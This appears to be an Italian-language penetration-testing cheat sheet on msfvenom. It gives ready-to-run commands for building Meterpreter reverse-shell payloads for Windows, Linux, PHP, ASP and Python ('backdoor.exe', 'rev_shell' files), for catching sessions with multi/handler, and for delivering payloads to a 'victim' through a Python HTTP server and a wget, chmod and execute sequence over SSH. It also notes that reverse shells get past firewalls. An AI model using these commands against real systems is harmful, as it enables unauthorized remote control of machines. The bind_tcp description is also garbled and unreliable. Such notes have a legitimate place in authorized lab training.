### Che cos’è?

E’ **un'utilità** a riga di comando usata per **generare e codificare** **payload MSF** **per** vari **sistemi** operativi e **server** web.

Msfvenom è una **combinazione** di due utilità: **msfpayload** e **msfencode.**

Possiamo utilizzare Msfvenom per **generare** un **payload meterpreter** dannoso che può essere **trasferito** a un sistema **client** di **destinazione**. **Una volta eseguito**, **si connetterà** nuovamente al nostro **gestore** di **payload** e ci **fornirà** **l'accesso remoto** al sistema di destinazione.

- Questi payload possono essere di diversi tipi, come reverse shell, bind shell, meterpeter, ecc.

### GENERARE PAYLOAD

MSFvenom può essere usato per creare payload in quasi tutti i formati, a seconda della configurazione del sistema di destinazione. In questi esempi, LHOST sarà l'indirizzo IP della macchina attaccante e LPORT sarà la porta su cui il gestore si metterà in ascolto. Formato Linux Executable and Linkable (elf):

- **`msfvenom`** lista tutti i possibili comandi
- **`msfvenom --list payloads`** lista tutti i payload che possiamo utilizzare
- **`msfvenom --list formats`** lista i formati con cui possiamo generare payloads
1. **`msfvenom -a x86/x64 -p SISTEMA TARGET/TIPO_SESSIONE_METERPRETER LHOST=MIO_IP LPORT=PORTA_IN_ASCOLTO -f FORMATO_SHELL > NOME_FILE.FORMATO_SELEZIONATO`**
    - **-a** indicare i BIT del Sistema target se x64 o x86
    - **-p** Indicare il Sistema target se Windows, Linux, Android etc e path sessione meterpreter
    - **LHOST** inserire l’ip in ascolto (mio IP)
    - **LPORT** inserire posta in ascolto
    - **-f** scegliere il formato del peyload (solitamente .exe
    - ESEMPIO: **msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.5 LPORT=1234 -f exe > backdoor.exe**
2. **msfconsole`use exploit/multi/handler`** creato il payload e caricato sul target ci mettiamo in ascolto con la sessione meterpreter
3. **`set payload PAYLOAD_UTILZZATO_X_MSFVENOM`** mettiamo lo stesso payload ES: **windows/meterpreter/reverse_tcp**
    1. **LHOST** inserire l’ip in ascolto (mio IP)
    2. **LPORT** inserire posta in ascolto
4. Ora avviando payload nel target e riceveremo una sessione meterpreter

### CARICARE PAYLOAD CON UN SERVER TEMPORANEO IN PYTHON

1. **`python3 -m http.server PORTA`** avvia un server HTTP semplice e temporaneo utilizzando Python, con lo scopo di condividere **file dalla directory corrente** attraverso la rete.
    - **-m http.server** modulo python integrato per creare un server in ascolto
2. **Accesso ai file tramite dispositivo target**
    - Se apri un browser dal dispositivo target vai su  `http://localhost:PORTA`  o `http://<MIO_IP>:PORTA`vedrai un elenco dei file nella directory.
    - I file possono essere scaricati direttamente cliccando sui link.

### Caricamento del payload sulla macchina vittima tramite SSH

- **ssh username@targetIP**
- **wget http://MIO_IP:porta/FILE_SHELL**
- **chmod +x FILE_SHELL** Cambio di permessi sul payload
- **./FILE_SHELL**  avviarlo nella sessione della vittima

### Esempi formato payload

**elf** si sa per generare payload di un binario linux

**dll** per file dll windows

- Windows: **msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f exe > rev_shell.exe**
- Linux**: msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf**
- PHP: **msfvenom -a x64 -p php/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.php**
- ASP: **msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f asp > rev_shell.asp**
- Python: **msfvenom -a x64 -p cmd/x64/meterpreter/reverse_python LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.py**

# Bind or Reverse

- **bind_tcp:** in questa modalità si **inietta** un **processo** sulla **macchina obiettivo**. Questo processo si metterà in **ascolto** su una determinata **porta**, attendendo connessioni dall’esterno. Nella modalità bind_tcp il **servizio** di **shell** è **attivo** sulla **macchina attaccante** e la **connessione avviene dalla macchina dell’attaccante alla macchina target.**
- **reverse_tcp**: in questa modalità si inietta un **processo** sulla macchina obiettivo, che questa volta **effettuerà dalla macchina target** **una connessione verso la macchina dell’attaccante** mettendo a disposizione una shell. **La differenza con il bind_tcp è che nel reverse_tcp è la macchina target che inizia la connessione verso la macchina dell’attaccante.**

DIFFERENZA IN TERMINI DI FURTIVITA’

Per bipassare i firewall statici si utilizza la reverse in quanto permette la fuoriuscita di dati dall’interno verso l’esterno. di conseguenza con la reverse abbiamo piu probabilità che l’attacco funzioni.
